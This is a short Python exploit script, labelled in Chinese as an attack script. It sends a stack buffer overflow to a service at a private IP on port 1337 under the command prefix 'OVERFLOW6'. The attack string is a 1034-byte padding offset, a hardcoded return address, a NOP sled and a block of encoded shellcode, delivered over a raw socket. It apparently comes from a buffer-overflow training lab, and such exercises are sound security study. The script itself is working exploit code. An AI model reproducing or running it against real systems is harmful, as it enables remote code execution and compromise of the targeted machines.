#coding=utf-8
#!/usr/bin/python

#攻击脚本

import socket

ip = "10.10.183.68"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034 
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"

padding = "\x90" * 16

buf = ""
buf+="\xdb\xd8\xd9\x74\x24\xf4\xba\x7d\x7d\x49\xc6\x58\x33\xc9\xb1"
buf+="\x52\x31\x50\x17\x03\x50\x17\x83\x95\x81\xab\x33\x99\x92\xae"
buf+="\xbc\x61\x63\xcf\x35\x84\x52\xcf\x22\xcd\xc5\xff\x21\x83\xe9"
buf+="\x74\x67\x37\x79\xf8\xa0\x38\xca\xb7\x96\x77\xcb\xe4\xeb\x16"
buf+="\x4f\xf7\x3f\xf8\x6e\x38\x32\xf9\xb7\x25\xbf\xab\x60\x21\x12"
buf+="\x5b\x04\x7f\xaf\xd0\x56\x91\xb7\x05\x2e\x90\x96\x98\x24\xcb"
buf+="\x38\x1b\xe8\x67\x71\x03\xed\x42\xcb\xb8\xc5\x39\xca\x68\x14"
buf+="\xc1\x61\x55\x98\x30\x7b\x92\x1f\xab\x0e\xea\x63\x56\x09\x29"
buf+="\x19\x8c\x9c\xa9\xb9\x47\x06\x15\x3b\x8b\xd1\xde\x37\x60\x95"
buf+="\xb8\x5b\x77\x7a\xb3\x60\xfc\x7d\x13\xe1\x46\x5a\xb7\xa9\x1d"
buf+="\xc3\xee\x17\xf3\xfc\xf0\xf7\xac\x58\x7b\x15\xb8\xd0\x26\x72"
buf+="\x0d\xd9\xd8\x82\x19\x6a\xab\xb0\x86\xc0\x23\xf9\x4f\xcf\xb4"
buf+="\xfe\x65\xb7\x2a\x01\x86\xc8\x63\xc6\xd2\x98\x1b\xef\x5a\x73"
buf+="\xdb\x10\x8f\xd4\x8b\xbe\x60\x95\x7b\x7f\xd1\x7d\x91\x70\x0e"
buf+="\x9d\x9a\x5a\x27\x34\x61\x0d\x42\xd8\x60\x17\x3a\xd8\x72\xb6"
buf+="\xe7\x55\x94\xd2\x07\x30\x0f\x4b\xb1\x19\xdb\xea\x3e\xb4\xa6"
buf+="\x2d\xb4\x3b\x57\xe3\x3d\x31\x4b\x94\xcd\x0c\x31\x33\xd1\xba"
buf+="\x5d\xdf\x40\x21\x9d\x96\x78\xfe\xca\xff\x4f\xf7\x9e\xed\xf6"
buf+="\xa1\xbc\xef\x6f\x89\x04\x34\x4c\x14\x85\xb9\xe8\x32\x95\x07"
buf+="\xf0\x7e\xc1\xd7\xa7\x28\xbf\x91\x11\x9b\x69\x48\xcd\x75\xfd"
buf+="\x0d\x3d\x46\x7b\x12\x68\x30\x63\xa3\xc5\x05\x9c\x0c\x82\x81"
buf+="\xe5\x70\x32\x6d\x3c\x31\x52\x8c\x94\x4c\xfb\x09\x7d\xed\x66"
buf+="\xaa\xa8\x32\x9f\x29\x58\xcb\x64\x31\x29\xce\x21\xf5\xc2\xa2"
buf+="\x3a\x90\xe4\x11\x3a\xb1";


payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

